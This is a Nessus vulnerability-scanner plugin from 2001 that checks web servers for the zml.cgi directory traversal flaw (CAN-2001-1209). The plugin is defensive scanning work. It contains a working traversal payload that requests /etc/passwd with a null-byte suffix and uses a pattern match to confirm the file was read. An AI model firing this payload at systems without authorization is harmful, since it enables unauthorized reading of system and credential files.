

#
# This script was written by Drew Hintz ( http://guh.nu )
# 
# It is based on scripts written by Renaud Deraison and  HD Moore
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10830); 
 script_cve_id("CAN-2001-1209");
 script_bugtraq_id(3759);
 script_version("$Revision: 1.9 $");

 name["english"] = "zml.cgi Directory Traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "
ZML.cgi is vulnerable to a directory traversal.  
It enables a remote attacker to view any file on the computer 
with the privileges of the cgi/httpd user.

More Information: http://www.securityfocus.com/archive/1/243404

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "zml.cgi is vulnerable to an exploit which lets an attacker view any file that the cgi/httpd user has access to.";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;


if(!get_port_state(port))exit(0);


function check(req)
{
  req = http_get(item:req, port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if ( r == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   	security_hole(port:port);
	return(1);
  }
 return(0);
}

dirs = cgi_dirs();
foreach dir (dirs)
{
 url = string(dir, "/zml.cgi?file=../../../../../../../../../../../../etc/passwd%00");
 if(check(req:url))exit(0);
}
